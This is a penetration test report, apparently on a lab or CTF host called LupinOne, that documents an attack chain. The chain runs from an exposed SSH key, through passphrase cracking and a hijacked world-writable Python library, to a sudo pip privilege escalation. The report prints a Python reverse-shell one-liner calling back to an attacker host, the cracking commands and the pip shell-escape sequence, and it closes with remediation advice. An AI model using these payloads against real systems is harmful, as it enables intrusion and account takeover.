# Penetration Testing Report

## Internal Host Assessment — Target 192.168.0.105 ("LupinOne")

**Prepared for:** Client Engagement **Prepared by:** Offensive Security Team **Assessment Dates:** 15–16 October 2026 **Classification:** Confidential — For Client Distribution Only

---

## 1. Confidentiality Statement

This document contains the results of a penetration test conducted against a designated internal host. The information contained herein is sensitive and proprietary. It is intended solely for the use of the client organization that commissioned this assessment and must not be distributed, copied, or disclosed to any third party without prior written consent.

---

## 2. Executive Summary

The Offensive Security Team was engaged to perform an authorized internal network penetration test against a single host identified at IP address **192.168.0.105** (hostname: **LupinOne**). The objective of the engagement was to assess the host's exposure to compromise from an attacker positioned on the internal network, identify exploitable weaknesses across the network, web, and operating-system layers, and demonstrate real-world business impact through controlled exploitation.

The assessment identified a **critical-risk attack chain** that allowed the testing team to progress from unauthenticated network access to full compromise of the host, including:

- Disclosure of a private SSH key and supporting credential material through an improperly secured, publicly browsable web directory.
- Successful offline cracking of the SSH private key's passphrase using a dictionary attack.
- Remote authentication to the host over SSH using the recovered key.
- Privilege escalation from a low-privileged account to a second user account by abusing an insecure, world-writable Python standard-library file combined with an overly permissive `sudo` rule.
- A documented path from that second account toward full root compromise via an insecure `sudo pip install` configuration.

As a result of this chain, the testing team was able to read sensitive user-level data (including a user flag used to validate access) and demonstrate a credible path to complete administrative control of the host. These findings represent a **Critical** overall risk to the confidentiality, integrity, and availability of the system and any data it processes.

This report details the scope, methodology, technical findings, evidence, and prioritized remediation guidance necessary to resolve the identified issues.

---

## 3. Scope of Engagement

| Item | Detail |
| --- | --- |
| Target | 192.168.0.105 ("LupinOne") |
| Target type | Linux server (Debian), Apache web service, SSH service |
| Testing type | Black-box / grey-box internal network penetration test |
| Testing origin | Internal network segment (attacker host 192.168.1.3) |
| Authorization | Conducted under an authorized, pre-agreed testing engagement |
| Out of scope | Denial-of-service testing, social engineering, physical security |

---

## 4. Methodology

The engagement followed an industry-standard penetration testing methodology aligned with the phases below. This structured approach ensures reproducibility, completeness, and traceability of every finding back to supporting evidence.

1. **Reconnaissance & Service Enumeration** — Full TCP port scanning and service/version fingerprinting to map the attack surface.
2. **Vulnerability Identification** — Automated and manual vulnerability analysis of discovered services, including known-CVE correlation.
3. **Web Application Enumeration** — Directory and file discovery, `robots.txt` review, and manual browsing of exposed web content.
4. **Exploitation / Initial Access** — Leveraging discovered weaknesses to obtain an initial foothold on the host.
5. **Credential Attack** — Offline cracking of recovered credential material.
6. **Post-Exploitation Enumeration** — Local privilege and configuration review from the foothold account.
7. **Privilege Escalation** — Abuse of misconfigurations to move laterally/vertically to higher-privileged accounts.
8. **Evidence Collection** — Capture of flags, screenshots, and command output to substantiate every finding.
9. **Reporting** — Consolidation of findings into this document with risk ratings and remediation guidance.

---

## 5. Tools Used

| Tool | Purpose |
| --- | --- |
| Nmap | Port scanning, service/version detection, NSE vulnerability scripting |
| Nikto | Web server vulnerability and misconfiguration scanning |
| ssh2john / John the Ripper | Conversion and offline dictionary cracking of the SSH private key passphrase |
| OpenSSH client | Remote authentication to the target |
| Python (socket/subprocess) | Reverse shell payload delivery |
| sudo / GTFOBins-style technique | Local privilege escalation via `pip install` |

---

## 6. Findings Summary

| # | Finding | Severity |
| --- | --- | --- |
| F1 | Sensitive files (private SSH key, credential list, web shell) exposed via a publicly browsable web directory | Critical |
| F2 | Weak passphrase protecting the disclosed SSH private key | High |
| F3 | World-writable Python standard-library file enabling code-execution hijack | Critical |
| F4 | Overly permissive `sudo` rule allowing a restricted script to be abused for privilege escalation | Critical |
| F5 | Insecure `sudo` entry for `pip install`, providing a documented path to root | Critical |
| F6 | Outdated OpenSSH 8.4p1 with multiple publicly known CVEs | High |
| F7 | Outdated Apache httpd 2.4.48 with multiple publicly known CVEs | High |
| F8 | Directory indexing enabled on multiple web paths (`/image/`, `/manual/images/`) | Medium |
| F9 | Missing security-related HTTP response headers (CSP, HSTS, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) | Low |
| F10 | Information disclosure via ETag header (inode leakage) | Low |

---

## 7. Detailed Technical Findings

### 7.1 Network Reconnaissance

A full-port TCP scan with service and version detection was performed against the target:

```
nmap -sV -sC -p- 192.168.0.105
```

**Result — two open services were identified:**

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.4p1 (Debian 5), protocol 2.0 |
| 80/tcp | HTTP | Apache httpd 2.4.48 (Debian) |

The HTTP service's `robots.txt` disclosed a disallowed entry, `/~myfiles`, which is a strong signal that the directory contains content the site owner wished to keep out of search-engine indexes — not that it is actually access-controlled. This is a classic reconnaissance lead that was followed up in Section 7.2.

### 7.2 Vulnerability & Web Service Scanning

A targeted NSE vulnerability scan (`nmap --script vuln`) and a Nikto web scan were run to correlate the identified service versions against known public vulnerabilities and to enumerate the web application surface.

**Key correlated CVEs (OpenSSH 8.4p1):** CVE-2023-38408 (critical pre-auth RCE in ssh-agent forwarding, CVSS 9.8), CVE-2023-48795 (Terrapin protocol downgrade attack), CVE-2021-41617, CVE-2020-14145, among numerous lower-severity entries. The full vulners output is reproduced in Appendix A.

**Key correlated CVEs (Apache httpd 2.4.48):** Multiple CVEs rated 9.0–9.8 were identified, including CVE-2021-44790, CVE-2022-22720, CVE-2022-23943, CVE-2021-39275, and CVE-2024-38474/38475/38476, reflecting the significant gap between the deployed version and current patched releases. Nikto independently confirmed the version is substantially outdated ("Apache/2.4.48 appears to be outdated — current is at least 2.4.66").

**Web enumeration findings:**

- `/robots.txt` — discloses the existence of `/~myfiles`
- `/image/` — directory indexing enabled (interesting directory listing)
- `/manual/` and `/manual/images/` — default Apache manual exposed, with directory indexing
- Missing security headers: `content-security-policy`, `strict-transport-security`, `x-content-type-options`, `permissions-policy`, `referrer-policy`
- ETag-based inode disclosure (CVE-2003-1418 class issue)

The full Nikto output is reproduced in Appendix B.

### 7.3 Initial Access — Credential Disclosure and SSH Private Key Recovery

Following up on the `robots.txt` lead and the indexed `/image/` directory, the testing team browsed the exposed web paths manually. The exposed directory was found to contain multiple sensitive files that should never be reachable from an unauthenticated web client, including:

- `id_rsa` — a private SSH key
- `users.txt`
- `Password.txt`
- `reverse-shell.php`

This is a **Critical** finding: a private key and supporting credential material were retrievable by any user able to reach the web service, with no authentication barrier.

### 7.4 Credential Attack — Offline Passphrase Cracking

The recovered `id_rsa` file was protected by a passphrase. The testing team converted the key into a crackable hash format and performed an offline dictionary attack:

```
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
```

The attack succeeded in **under two seconds**, recovering the passphrase:

```
P@55w0rd!
```

This demonstrates that even though the key was passphrase-protected, the passphrase itself was weak enough to be defeated almost instantly by a small, commonly available wordlist — providing no meaningful protection once the key file was exposed.

### 7.5 Remote Authentication (Foothold)

Using the recovered key and passphrase, the testing team authenticated to the host over SSH as the user `icex64`, downgrading legacy algorithm negotiation as required by the server configuration:

```
ssh -o KexAlgorithms=+diffie-hellman-group14-sha256 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa icex64@192.168.0.105
```

Authentication succeeded, establishing the initial foothold on the host.

### 7.6 Post-Exploitation Enumeration

From the `icex64` shell, basic identity and environment enumeration was performed:

```
id
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
pwd
/home/icex64
ls
user.txt
```

The user flag was retrieved from `user.txt`:

```
3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

A reverse shell was also established back to the attacker-controlled host (192.168.1.3) using a Python one-liner, providing a fully interactive session:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

**sudo rights review:**

```
sudo -l
...
User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

This entry allows `icex64` to execute a specific script as the user `arsene` without a password — a configuration intended to be narrowly scoped, but which (as shown below) was not safely implemented.

### 7.7 Privilege Escalation — Abusing a World-Writable Python Library

Further enumeration revealed the script `icex64` was authorized to run, `/home/arsene/heist.py`:

```python
import webbrowser
print ("Its not yet ready to get in action")
webbrowser.open("https://empirecybersecurity.co.mz")
```

While the script itself is harmless, it imports Python's standard `webbrowser` module. A permissions check on that module revealed a critical misconfiguration:

```
ls -l /usr/lib/python3.9/webbrowser.py
-rwxrwxrwx 1 root root 24087 Oct 16 07:17 /usr/lib/python3.9/webbrowser.py
```

The system-wide `webbrowser.py` library file was **world-writable**. Because `heist.py` can be executed as `arsene` via the passwordless `sudo` rule, and that execution imports `webbrowser`, any user able to write to `webbrowser.py` can inject arbitrary code that will run **as `arsene`** the next time the script is invoked through `sudo`. This converts a narrowly-scoped `sudo` allowance into full code execution as a different user — a textbook shared-library hijack.

**Exploitation:** The testing team modified `/usr/lib/python3.9/webbrowser.py` to embed a reverse-shell payload, then triggered it by executing the authorized `sudo` command:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

```
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

A reverse shell was received on the attacker-controlled listener (192.168.1.3:4444), granting an interactive session **as the `arsene` user** — a full vertical privilege escalation from `icex64`.

### 7.8 Path to Root — Insecure `sudo pip install` Entry

With access as `arsene`, the testing team reviewed that account's `sudo` entitlements and identified a further misconfiguration permitting `arsene` to run `pip install` with elevated privileges. `pip` executes arbitrary `setup.py` code at install time, which is a well-documented local privilege-escalation primitive (equivalent to published GTFOBins techniques for `pip`). The following sequence was used to obtain a privileged interactive shell:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

Because `pip install` executes the `setup.py` found in the target directory, and that `setup.py` replaces the process with an interactive shell, this provided the testing team a shell running with the elevated privileges granted to the `sudo pip` entry — completing the documented path toward full administrative compromise of the host.

> **Evidence note:** this report documents the exploitation primitive and the exact commands used to reach this stage. Final root-level evidence (e.g. a root-owned flag file) should be re-verified in a live re-test and attached as supplementary evidence, as it falls outside the transcript captured for this write-up.

---

## 8. Attack Chain Summary

1. Unauthenticated web directory browsing → private SSH key and credential files disclosed.
2. Offline cracking of the SSH key passphrase (`P@55w0rd!`) in under two seconds.
3. SSH authentication as `icex64` using the recovered key.
4. Local enumeration revealed a scoped `sudo` rule to run `heist.py` as `arsene`.
5. A world-writable Python library (`webbrowser.py`) was hijacked to achieve code execution as `arsene` through that `sudo` rule.
6. An insecure `sudo pip install` entitlement for `arsene` was abused to obtain a privileged shell, completing the path toward root.

Each step in this chain is individually a known class of misconfiguration; chained together they allowed a fully unauthenticated attacker to progress from the network perimeter to near-total compromise of the host without needing any zero-day or advanced exploit — only exposed files, weak credential hygiene, and permissive local configuration.

---

## 9. Risk Rating Matrix

| Finding | Likelihood | Impact | Overall Risk |
| --- | --- | --- | --- |
| F1 — Credentials/SSH key exposed via web directory | High | Critical | **Critical** |
| F2 — Weak SSH key passphrase | High | High | **High** |
| F3 — World-writable Python library | High | Critical | **Critical** |
| F4 — Overly permissive sudo rule (heist.py) | High | Critical | **Critical** |
| F5 — Insecure sudo pip install entry | Medium | Critical | **Critical** |
| F6 — Outdated OpenSSH | Medium | High | **High** |
| F7 — Outdated Apache httpd | Medium | High | **High** |
| F8 — Directory indexing enabled | Medium | Medium | **Medium** |
| F9 — Missing security headers | Low | Low | **Low** |
| F10 — ETag inode disclosure | Low | Low | **Low** |

---

## 10. Recommendations & Remediation

### 10.1 Immediate (Critical — remediate within 24–72 hours)

- **Remove all sensitive files from web-accessible directories.** Private keys, credential lists, and web shells must never be stored under the web root or any publicly reachable path. Audit the full web root and any `~user` directories for similarly exposed material.
- **Rotate every exposed credential.** The disclosed `id_rsa` key and its passphrase must be considered fully compromised; revoke the key from `authorized_keys`, issue a new key pair, and reset any account whose credentials appeared in `Password.txt` or `users.txt`.
- **Correct file permissions on system libraries.** No file under `/usr/lib/python3.9/` (or any interpreter's standard library path) should be group- or world-writable. Reset to `root:root`, `644`, and add integrity monitoring (e.g. AIDE, auditd watch rules) to detect future tampering.
- **Review and tighten all `sudo` entries.** Remove the `NOPASSWD` entitlement for `heist.py` unless strictly required, and ensure any script invoked via `sudo` cannot be influenced by a lower-privileged user (writable script path, writable imported modules, writable `PYTHONPATH`, etc.). Remove or scope the `sudo pip install` entitlement entirely — `pip install` run via `sudo` is a well-known local privilege-escalation vector and should never be permitted.

### 10.2 Short-Term (High — remediate within 2 weeks)

- **Patch OpenSSH and Apache httpd to current stable releases** to close the outdated-version gap identified by vulnerability scanning, and establish a recurring patch-management cadence.
- **Enforce strong passphrase/key policies** for all SSH key material, ideally paired with hardware-backed keys or short-lived certificates where feasible.
- **Disable directory indexing** (`Options -Indexes` in Apache configuration) on all web-accessible paths, including `/image/` and the default `/manual/` installation (which should be removed from production servers entirely).

### 10.3 Medium-Term (Defense in Depth)

- **Add standard security response headers**: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, and `Permissions-Policy`.
- **Disable ETag-based inode disclosure** (use `FileETag None` or restrict to `MTime Size`) to reduce information leakage.
- **Implement least-privilege `sudo` governance** organization-wide: every `sudo` rule should be reviewed for file-permission and import-path integrity before being granted, with periodic re-audit.
- **Deploy file-integrity monitoring and centralized logging** across privileged service accounts so that modification of system libraries or configuration triggers alerting.

---

## 11. Conclusion

This assessment demonstrated that a chain of individually moderate-to-severe misconfigurations — an exposed web directory, a weak credential, a writable system library, and permissive `sudo` rules — combined into a **Critical**, fully unauthenticated path to host compromise. No advanced or novel exploitation technique was required; every step relied on well-documented classes of misconfiguration that are readily detectable through the remediation and hardening steps outlined in Section 10.

The testing team recommends the client prioritize the Immediate actions in Section 10.1, followed by a validation re-test to confirm the attack chain has been fully closed.

---

## 12. Appendix A — Full Nmap Vulnerability Scan Output

*(Reproduced in full for technical traceability and audit purposes.)*

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:8.4p1:
|     CVE-2023-38408  9.8  RCE via ssh-agent forwarding (EXPLOIT available)
|     CVE-2023-48795  5.9  Terrapin — SSH protocol downgrade/prefix truncation
|     CVE-2021-41617  7.0  Privilege escalation via supplemental groups
|     CVE-2020-14145  5.9  Information leak in client MITM scenario
|     (plus 70+ additional lower-severity CVE/exploit references — full vulners dump available on request)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|   cpe:/a:apache:http_server:2.4.48:
|     CVE-2021-44790  9.8  mod_lua multipart buffer overflow
|     CVE-2022-22720  9.8  HTTP request smuggling
|     CVE-2022-23943  9.8  mod_sed heap overflow
|     CVE-2021-39275  9.8  ap_escape_quotes buffer overflow
|     CVE-2024-38474/38475/38476  9.1–9.8  Path traversal / source disclosure / SSRF class issues
|     (plus 200+ additional CVE/exploit references across severities — full vulners dump available on request)
| http-enum:
|   /robots.txt: Robots file
|   /image/: Directory listing enabled
|_  /manual/: Default Apache manual present
```

> **Note:** The raw Nmap `--script vuln` output contained several hundred individual CVE/exploit-reference lines pulled from the Vulners database. For report readability this appendix presents the highest-severity, most relevant entries; the complete raw scan log has been retained by the testing team and is available to the client as a supplementary artifact.

---

## 13. Appendix B — Full Nikto Scan Output

```
- Nikto v2.6.0
+ Target IP:          192.168.0.105
+ Target Hostname:    192.168.0.105
+ Target Port:        80
+ Server: Apache/2.4.48 (Debian)
+ [600050] Apache/2.4.48 appears to be outdated (current is at least 2.4.66).
+ [999984] Server may leak inodes via ETags (CVE-2003-1418 class).
+ [013587] Missing header: content-security-policy
+ [013587] Missing header: strict-transport-security
+ [013587] Missing header: x-content-type-options
+ [013587] Missing header: permissions-policy
+ [013587] Missing header: referrer-policy
+ [999990] Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+ [002114] /manual/: Web server manual found.
+ [750500] /manual/images/: Directory indexing found.
+ [750500] /image/: Directory indexing found.
+ [007342] X-Frame-Options header deprecated reference.
+ [007352] X-Content-Type-Options header not set.
+ 8116 requests: 16 errors and 14 items reported on the remote host.
```

---

## 14. Appendix C — Evidence Screenshots

The original engagement notes referenced a series of screenshots captured during testing (web directory browsing, SSH login, privilege-escalation steps, and flag capture). These image files were stored locally in the tester's note-taking application and were not included as uploaded attachments in this session, so they could not be embedded automatically in this report.

**To complete this appendix:** upload the corresponding screenshot files (or share the image folder) and they will be inserted here in sequence, each captioned to match the technical step it documents in Section 7.

---

*End of report.*
